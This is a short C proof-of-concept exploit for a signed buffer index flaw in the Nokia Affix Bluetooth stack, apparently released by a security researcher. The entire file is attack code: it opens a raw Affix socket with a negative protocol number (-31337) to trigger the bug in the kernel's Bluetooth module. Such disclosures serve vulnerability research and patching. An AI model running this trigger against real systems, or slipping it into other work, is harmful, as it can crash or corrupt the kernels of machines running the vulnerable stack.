/*
        Nokia Affix Bluetooth Signed Buffer Index PoC
        - kf_lists[at]digitalmunition[dot]com
*/


#include <sys/socket.h>
#include <affix/bluetooth.h>
#include <affix/hci_cmds.h>
#include <affix/hci_types.h>

main()
{
       int ctl;


       if ((ctl = socket(PF_AFFIX, SOCK_RAW, -31337)) < 0)
       {
               perror("Something went wrong?");
               exit(1);
       }
}
